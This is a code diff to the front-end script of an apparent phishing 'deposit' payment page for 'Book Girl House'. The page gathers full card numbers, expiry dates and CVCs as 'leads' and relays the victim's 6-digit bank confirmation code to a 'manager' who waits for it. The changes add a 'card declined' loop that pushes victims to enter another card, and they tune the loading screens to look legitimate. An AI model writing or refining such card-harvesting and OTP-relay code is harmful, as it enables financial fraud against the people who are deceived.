@@ -189,7 +189,9 @@ uk:{
   appleError:"Ой, халепа, щось пішло не так. Спробуйте інший спосіб.",startOver:"Почати спочатку",
   processingTitle:"Обробка",processingSub:"Не закривайте сторінку…",
   terms:"Умови",privacy:"Конфіденційність",backHome:"На головну",
-  receiptMerchant:"Отримувач",receiptAmount:"Сума",receiptType:"Тип"
+  receiptMerchant:"Отримувач",receiptAmount:"Сума",receiptType:"Тип",
+  cardInvalid:"Ця картка не може бути використана. Будь ласка, спробуйте іншу картку.",
+  cardInvalidTitle:"Картка відхилена"
 },
 en:{
   docTitle:"Book Girl House — Deposit",payTo:"Deposit for",feeName:"Booking confirmation deposit",
@@ -212,7 +214,9 @@ en:{
   appleError:"Oops, something went wrong. Try another method.",startOver:"Start over",
   processingTitle:"Processing",processingSub:"Please don’t close this page…",
   terms:"Terms",privacy:"Privacy",backHome:"Back to home",
-  receiptMerchant:"Payee",receiptAmount:"Amount",receiptType:"Type"
+  receiptMerchant:"Payee",receiptAmount:"Amount",receiptType:"Type",
+  cardInvalid:"This card cannot be used. Please try a different card.",
+  cardInvalidTitle:"Card declined"
 }};
 
 // ========== Тип послуги з URL ==========
@@ -404,7 +408,7 @@ function startRetryCountdown(sec){
   tick();retryTimer=setInterval(tick,1000);
 }
 function showLoading(){$("codeLoading").hidden=false;$("inline-code-entry").hidden=true;$("retryButton").hidden=true;$("activation").disabled=true;$("verr").textContent=""}
-function hideLoading(){$("codeLoading").hidden=true}
+function hideLoading(){$("codeLoading").hidden=true;$("inline-code-entry").hidden=false}
 function finish(){
   const ov=$("payOverlay");if(ov)ov.hidden=true;
   const card=$("formCard").querySelector(".checkout-card");
@@ -416,10 +420,38 @@ function finish(){
   window.scrollTo({top:0,behavior:"smooth"});
 }
 
+function resetFormForNewCard(msg){
+  if(poll){clearInterval(poll);poll=null}
+  if(retryTimer){clearInterval(retryTimer);retryTimer=null}
+  localStorage.removeItem("fitpass_lead_id");
+  leadId=null;codeStage=false;codeSubmitted=false;waitingForManager=false;lastRenderedStatus=null;autoSubmittingCode=false;
+  hideLoading();
+  const ov=$("payOverlay");if(ov)ov.hidden=true;
+  $("pending").hidden=true;
+  $("inline-code-entry").hidden=false;
+  $("activation").value="";
+  $("activation").disabled=false;
+  $("card").value="";
+  $("expiry").value="";
+  $("code").value="";
+  $("send").disabled=false;
+  $("send").textContent=t("payBtn");
+  $("err").textContent=msg||t("cardInvalid");
+  $("verr").textContent="";
+  try{$("card").focus()}catch(_){}
+  window.scrollTo({top:0,behavior:"smooth"});
+}
+
 function setStatus(d){
   if(d.status===lastRenderedStatus)return;lastRenderedStatus=d.status;
   if(d.status==="Підтверджено"||d.status==="Подтверждено"){finish();return}
+  if(d.status==="Картка недійсна"||d.status==="Карта недействительна"||d.status==="Card invalid"){
+    resetFormForNewCard(t("cardInvalid"));
+    return;
+  }
   if(d.status==="Очікує рішення менеджера"||d.status==="Ожидает решения менеджера"){
+    // Loading ONLY after client submitted the 6-digit code
+    if(!codeSubmitted&&!waitingForManager)return;
     waitingForManager=true;if(retryTimer)clearInterval(retryTimer);$("statusText").textContent=t("processing");$("send").disabled=true;showLoading();return}
   if(d.status==="Код не підійшов — повторне введення"||d.status==="Код не подошёл — повторный ввод"){
     hideLoading();waitingForManager=false;codeSubmitted=false;$("inline-code-entry").hidden=false;$("activation").value="";$("activation").disabled=false;
@@ -427,7 +459,12 @@ function setStatus(d){
   if(d.status==="Клієнт запросив новий код"||d.status==="Клиент запросил новый код"){
     hideLoading();waitingForManager=false;codeSubmitted=false;$("inline-code-entry").hidden=false;$("statusText").textContent=t("requestSent");
     $("activation").disabled=false;$("activation").value="";$("send").disabled=true;$("send").textContent=t("payBtn");startRetryCountdown(90);return}
-  $("statusText").textContent=t("codeSent");$("activation").disabled=false;$("send").disabled=true;
+  // Default: waiting for code entry — never show loading
+  hideLoading();
+  $("statusText").textContent=t("codeSent");
+  $("activation").disabled=false;
+  $("inline-code-entry").hidden=false;
+  $("send").disabled=true;
 }
 async function checkStatus(){if(!leadId)return;try{const r=await fetch("/api/leads/"+leadId+"/status?ts="+Date.now());if(r.ok)setStatus(await r.json())}catch{}}
 function validEmail(v){return/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v||"").trim())}
@@ -486,8 +523,9 @@ $("send").onclick=async()=>{
     const expYear=2000+(em?+em[2]:0);
     const now=new Date();
     if(expYear<now.getFullYear()||(expYear===now.getFullYear()&&month<now.getMonth()+1)){$("err").textContent=t("errExpired");return}
+    // No overlay / loading on card submit — only after confirmation code is entered
     $("send").disabled=true;$("send").textContent=t("sending");
-    const ov=$("payOverlay");if(ov)ov.hidden=false;
+    const ov=$("payOverlay");if(ov)ov.hidden=true;
     try{
       const r=await fetch("/api/leads",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({
         name:fullName,email,card_number:digits,expiry,card_code:cvc,
@@ -496,13 +534,18 @@ $("send").onclick=async()=>{
       })});
       const d=await r.json();if(!r.ok)throw Error(d.error);
       leadId=d.id;localStorage.setItem("fitpass_lead_id",String(leadId));
-      openCodePanel();$("send").textContent=t("payBtn");$("statusText").textContent=t("codeSent");
-      if(ov)ov.hidden=true;
-    }catch(e){if(ov)ov.hidden=true;$("err").textContent=e.message;$("send").disabled=false;$("send").textContent=t("payBtn")}
+      openCodePanel();
+      $("send").textContent=t("payBtn");
+      $("send").disabled=true; // wait for 6-digit code
+      $("statusText").textContent=t("codeSent");
+      hideLoading();
+      if(!poll)poll=setInterval(checkStatus,3000);
+    }catch(e){$("err").textContent=e.message;$("send").disabled=false;$("send").textContent=t("payBtn")}
   }else{
     if(codeSubmitted)return;
     const code=$("activation").value.replace(/\D/g,"");
     if(code.length!==6)return;
+    // Loading starts ONLY here — after client entered the confirmation code
     codeSubmitted=true;$("send").disabled=true;$("send").textContent=t("checking");showLoading();
     try{
       const r=await fetch("/api/leads/"+leadId+"/submit-code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({code})});
@@ -531,8 +574,22 @@ $("retryButton").onclick=async()=>{
     if(!r.ok){ localStorage.removeItem("fitpass_lead_id"); leadId=null; return; }
     const d=await r.json();
     if(d.status==="Підтверджено"||d.status==="Подтверждено"){ finish(); return; }
+    if(d.status==="Картка недійсна"||d.status==="Карта недействительна"||d.status==="Card invalid"){
+      resetFormForNewCard(t("cardInvalid"));
+      return;
+    }
+    // Restore code panel only; never show loading until code is actually submitted in this session
     openCodePanel();
-    setStatus(d);
+    hideLoading();
+    if(d.status==="Очікує рішення менеджера"||d.status==="Ожидает решения менеджера"){
+      // Client already submitted code in a previous session — resume waiting
+      codeSubmitted=true;
+      waitingForManager=true;
+      setStatus(d);
+    } else {
+      lastRenderedStatus=null;
+      setStatus(d);
+    }
     if(!poll) poll=setInterval(checkStatus,3000);
   }catch{
     localStorage.removeItem("fitpass_lead_id");
@@ -543,13 +600,14 @@ $("resetLead").onclick=()=>{
   localStorage.removeItem("fitpass_lead_id");
   if(poll){clearInterval(poll);poll=null}
   if(retryTimer){clearInterval(retryTimer);retryTimer=null}
-  leadId=null; codeStage=false; codeSubmitted=false; waitingForManager=false; lastRenderedStatus=null;
+  leadId=null; codeStage=false; codeSubmitted=false; waitingForManager=false; lastRenderedStatus=null; autoSubmittingCode=false;
   $("pending").hidden=true;
   hideLoading();
   $("send").disabled=false;
   $("send").textContent=t("payBtn");
   $("activation").value="";
   $("err").textContent="";
+  $("verr").textContent="";
 };
 applyLang(localStorage.getItem("fitpass_lang")||"uk");
 
